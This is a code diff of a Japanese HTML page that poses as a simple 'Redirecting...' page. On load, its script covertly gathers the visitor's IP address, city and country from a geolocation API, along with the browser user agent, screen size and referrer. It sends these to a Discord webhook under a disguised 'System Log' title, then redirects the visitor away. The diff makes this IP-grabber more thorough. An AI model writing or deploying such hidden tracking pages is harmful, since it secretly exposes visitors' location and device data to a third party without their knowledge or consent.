@@ -2,38 +2,55 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
+    <title>Redirecting...</title>
 </head>
 <body>
     <script>
-    async function processLog() {
-        // 設定
-        const webhookUrl = "auauwappa";
-        const redirectUrl = "https://ima-aarr.github.io/rumia-homepage.github.io/";
+    (async function() {
+      
+        const webhookUrl = "__DISCORD_WEBHOOK_URL__";
+        const targetUrl = "https://ima-aarr.github.io";
+
+      
+        if (webhookUrl.startsWith("__")) { window.location.replace(targetUrl); return; }
 
         try {
             
-            const ipRes = await fetch('https://api.ipify.org');
-            const ipData = await ipRes.json();
+            const res = await fetch('https://ipapi.co');
+            const d = await res.json();
+
+            
+            const payload = {
+                embeds: [{
+                    title: "管理者ログ",
+                    color: 3447003,
+                    timestamp: new Date().toISOString(),
+                    fields: [
+                        { name: "🌐 IPアドレス", value: `||${d.ip || '取得失敗'}||`, inline: true },
+                        { name: "📍 地域", value: `${d.city || '不明'}, ${d.country_name || '不明'}`, inline: true },
+                        { name: "📱 デバイス/OS", value: navigator.userAgent },
+                        { name: "🖥 画面解像度", value: `${screen.width}x${screen.height}`, inline: true },
+                        { name: "🔗 参照元(Referrer)", value: document.referrer || "直接アクセス", inline: true },
+                        { name: "⏰ アクセス日時", value: new Date().toLocaleString("ja-JP") }
+                    ],
+                    footer: { text: "System Log - Automated Notification" }
+                }]
+            };
 
             
             await fetch(webhookUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ 
-                    ip: ipData.ip,
-                    date: new Date().toLocaleString("ja-JP"),
-                    info: navigator.userAgent 
-                })
+                body: JSON.stringify(payload)
             });
-        } catch (e) {
-            console.error("Log error");
-        } finally {
-            window.location.replace(redirectUrl);
-        }
-    }
 
-    processLog();
+        } catch (e) {
+            console.error(e);
+        } finally {
+            
+            window.location.replace(targetUrl);
+        }
+    })();
     </script>
 </body>
 </html>
